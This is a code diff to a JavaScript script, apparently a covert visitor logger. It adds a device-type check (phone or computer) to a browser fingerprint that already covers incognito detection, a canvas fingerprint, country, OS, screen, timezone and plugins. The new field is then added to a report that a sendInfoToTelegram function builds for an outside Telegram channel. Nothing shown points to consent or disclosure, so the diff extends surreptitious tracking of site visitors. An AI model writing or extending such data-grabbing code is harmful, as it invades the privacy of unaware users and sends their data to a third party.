@@ -40,6 +40,16 @@ async function isIncognito() {
     });
 }
 
+// 📌 Xác định loại thiết bị (Điện thoại hay Máy tính)
+function getDeviceType() {
+    const ua = navigator.userAgent;
+    const mobileKeywords = [
+        "iPhone", "iPad", "iPod", "Android", "BlackBerry", "Windows Phone",
+        "Mobile", "Opera Mini", "IEMobile"
+    ];
+    return mobileKeywords.some(keyword => ua.includes(keyword)) ? "Điện thoại" : "Máy tính";
+}
+
 // 📌 Lấy thông tin thiết bị
 async function getDeviceFingerprint() {
     const canvas = document.createElement("canvas");
@@ -57,7 +67,8 @@ async function getDeviceFingerprint() {
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Không xác định",
         screenResolution: `${screen.width}x${screen.height}`,
         colorDepth: screen.colorDepth || "Không xác định",
-        plugins: navigator.plugins.length ? Array.from(navigator.plugins).map(p => p.name).join(", ") : "Không có"
+        plugins: navigator.plugins.length ? Array.from(navigator.plugins).map(p => p.name).join(", ") : "Không có",
+        deviceType: getDeviceType() // Thêm loại thiết bị
     };
 }
 
@@ -102,6 +113,7 @@ async function sendInfoToTelegram() {
 🌏 Quốc gia: ${country}
 
 🖥️ **THÔNG TIN HỆ THỐNG**
+📱 Loại thiết bị: ${fingerprint.deviceType}
 🌐 Trình duyệt: ${fingerprint.browser}
 🕵️ Ẩn danh: ${fingerprint.incognito ? "Có" : "Không"}
 💻 Hệ điều hành: ${fingerprint.platform}
